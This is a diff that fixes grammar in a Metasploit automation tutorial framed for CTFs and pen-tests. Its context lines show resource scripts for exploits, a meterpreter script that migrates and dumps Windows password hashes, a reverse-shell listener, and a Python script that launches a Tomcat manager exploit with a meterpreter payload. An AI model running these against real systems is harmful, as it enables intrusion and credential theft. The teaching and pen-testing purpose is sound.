@@ -24,13 +24,12 @@ _Disclaimer & Caveat Lector: This article is for educational purposes only. The 
 
 ### <a id="Introduction"></a>Introduction
 
-This article assumes that the reader have some knowledge of Metasploit Framework (MSF) and those who are unfamiliar with the general workings should consult "Metasploit Unleashed", the MSFU¹, a free ethical hacking course. Also known as the MSF manual.
-As MSF use can get trivial, it is useful, to know how to automize usage both for convenience an speed. In this article we will learn how to use MSF with scripts with the build in interpreter and some hints on how to use MSF with python.
+This article assumes that the reader has some knowledge of Metasploit Framework (MSF) and those who are unfamiliar with the general workings should consult "Metasploit Unleashed", the MSFU¹, a free ethical hacking course. Also known as the MSF manual. As MSF use can get trivial, it is useful, to know how to automatize usage both for convenience and speed. In this article we will learn how to use MSF with scripts with the built in interpreter and some hints on how to use MSF with python.
 
 
-### <a id="Record"></a>How To Record a MSF Script
+### <a id="Record"></a>How To Record an MSF Script
 
-The simplest way to make a MSF script is to record one with the "makerc" command. Simply use MSF as you normally would and then "record" / dump commands into a file. This is similar to record macro in e.g. Miscrosoft Excel.
+The simplest way to make an MSF script is to record one with the "makerc" command. Simply use MSF as you normally would and then "record" / dump commands into a file. This is similar to record macro in e.g. Miscrosoft Excel.
 
 ```
 msf exploit> makerc savefile.rc
@@ -54,11 +53,10 @@ set lport 4447
 exploit -j
 ```
 
-As one can see its, nothing more than the commands typed, line by line.
+As one can see, it's nothing more than the commands typed, line by line. 
 Next chapter explains how to use/resource a script.
 
-
-### <a id="Use"></a>How To Use/Resource a MSF Script
+### <a id="Use"></a>How To Use/Resource an MSF Script
 
 When using the recorded script later one can manually edit e.g. the lhost and then run by using the resource command:
 
@@ -74,9 +72,8 @@ Now it is easy to use exploit unreal_ircd_3281_backdoor when needed.
 
 ### <a id="Writing"></a>Writing MSF Scripts
 
-As the reader probably reckoned writing a MSF resource script is quite straightforward as its simply a list of msfconsole commands in a textfile.
+As the reader probably reckoned writing a MSF resource script is quite straightforward as its simply a list of msfconsole commands in a textfile. 
 A neat script that comes in handy is a meterpreter automation script for Windows hacking. Especially for CTFs like "Hack The Box"².
-
 ```
 run post/windows/manage/priv_migrate
 hashdump
@@ -107,7 +104,7 @@ In this section examples of useful scripts are listed and explained.
 
 #### <a id="AutoListen"></a>Auto Listener
 
-Doing CTFs, or pen-tests, with metasploit one often uses listeners for reverse shells such as the one used earlier with MS17-010. Shown below is the simple code for an auto listener script.
+Doing CTFs, or pen-tests with metasploit, one often uses listeners for reverse shells such as the one used earlier with MS17-010. Shown below is the simple code for an auto listener script.
 
 ```
 use exploit/multi/handler
@@ -157,11 +154,11 @@ Useful for most engagements.
 
 ### <a id="#Python"></a>Going Deeper by Using Python
 
-What if MSF could be combined with the hackers favorite programming language Python? Much could be achieved indeed. Luckily such a framework exists, namely PyMetasploit⁴ which is somewhat newer than the Spiderlabs msfrpc⁵ equivalent. For installation of either refer to the respective Github repos⁴/⁵. PyMetasploit describes itself as:
+What if MSF could be combined with the hacker's favorite programming language Python? Much could be achieved indeed. Luckily such a framework exists, namely PyMetasploit⁴ which is somewhat newer than the Spiderlabs msfrpc⁵ equivalent. For installation of either refer to the respective Github repos⁴/⁵. PyMetasploit describes itself as:
 
 > _PyMetasploit is a full-fledged msfrpc library for Python. It is meant to interact with the msfrpcd daemon that comes with the latest versions of Metasploit. It does NOT interact with the console-based scripts that Metasploit provides such as msfconsole, msfvenom, etc. Therefore, before you can begin to use this library, you'll need to initialize msfrpcd and optionally (highly recommended) PostgreSQL._
 
-So informed lets learn from the following example⁶, which should be safed as 'exploit_tomcat_maanger.py' in PyMetasploit folder:
+So informed let's learn from the following example⁶, which should be saved as 'exploit_tomcat_manager.py' in PyMetasploit folder:
 
 ```
 import metasploit.msfrpc
@@ -184,13 +181,13 @@ console.execute('set payload java/meterpreter/bind_tcp')
 console.execute('run')
 ```
 
-Before running the script start a msfrpc instance from command prompt:
+Before running the script start an msfrpc instance from command prompt:
 ```
 $> msfrpcd -P '' -U msf
 ```
 ![image](msfrpcdstart.png)
 
-Obviously the two "from/import" lines imports the msfrpc modules in usual Python fashion and enables os to work with Msfrpc. The code:
+Obviously the two "from/import" lines import the msfrpc modules in usual Python fashion and enables us to work with Msfrpc. The code:
 
 ```
 exploits = client.modules.exploits
@@ -221,7 +218,7 @@ The above screenshot shows the executing of the script.
 
 ### <a id="Conclusion"></a>Conclusion
 
-In this guide we learned to improve the use of MSF both by using the build in scripting engine as well as interacting with msfrpc using Python. The reader can go deeper into this subjects by visiting the links in the Surf section.
+In this guide we learned how to improve the use of MSF both by using the built in scripting engine as well as interacting with msfrpc using Python. The reader can go deeper into this subjects by visiting the links in the Surf section.
 
 
 ### <a id="Surf"></a>Surf
